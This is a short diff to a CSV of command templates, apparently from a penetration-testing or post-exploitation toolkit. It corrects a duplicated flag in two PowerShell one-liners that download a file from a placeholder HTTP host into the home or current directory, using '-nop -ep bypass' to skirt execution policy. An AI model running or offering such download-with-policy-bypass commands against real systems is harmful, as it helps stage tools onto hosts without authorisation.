@@ -1,3 +1,3 @@
 name,description,command
-psIwrHome,Download file using powershell webrequest into home dir,powershell -nop -ep bypass iwr -uri -outfile $HOME/$$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
-psIwr,Download file using powershell webrequest into act dir,powershell -nop -ep bypass iwr -uri -outfile $$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
+psIwrHome,Download file using powershell webrequest into home dir,powershell -nop -ep bypass iwr -outfile $HOME/$$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
+psIwr,Download file using powershell webrequest into act dir,powershell -nop -ep bypass iwr -outfile $$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
